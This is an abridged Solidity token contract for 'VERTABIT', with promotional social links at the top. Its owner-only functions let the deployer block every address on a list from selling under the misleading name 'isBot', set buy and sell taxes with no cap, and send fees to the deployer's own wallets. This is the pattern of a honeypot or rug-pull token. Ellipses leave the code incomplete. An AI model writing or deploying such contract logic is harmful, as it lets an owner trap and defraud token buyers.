/**
 TELEGRAM :https://t.me/vertabitEcosystem
 WEBSITE  :https://vertabit.com/
 TWITTER  :https://twitter.com/vertabit
...
contract VERTABIT is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "VERTABIT";
    string private constant _symbol = "VERTA";
    ...
    address public _DevWallet = msg.sender;
    address public _MarketingWallet = msg.sender;
    address payable public DevWallet = payable(_DevWallet);
    address payable public MarketingWallet = payable(_MarketingWallet);
    ...
    function isBot() external onlyOwner {
        for (uint256 i = 0; i < _Excluded.length; i++) {
            _isExcludeds[_Excluded[i]] = true;}
    }

    function setFee(uint256 buytax, uint256 selltax) external onlyOwner {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }

    function setTxAmount (uint256 maxtx, uint256 maxwal) external onlyOwner {
        _maxTxAmount = _tTotal * maxtx / 100;
        _maxWalletToken = _tTotal * maxwal / 100;
    }
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 15 <= block.timestamp) {limitInEffect = false;}
        if (tradingActiveBlock + 15 <= block.timestamp) {transferDelay = false;}
        if (!transferDelay && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + 15 <= block.timestamp) {idclaim();}
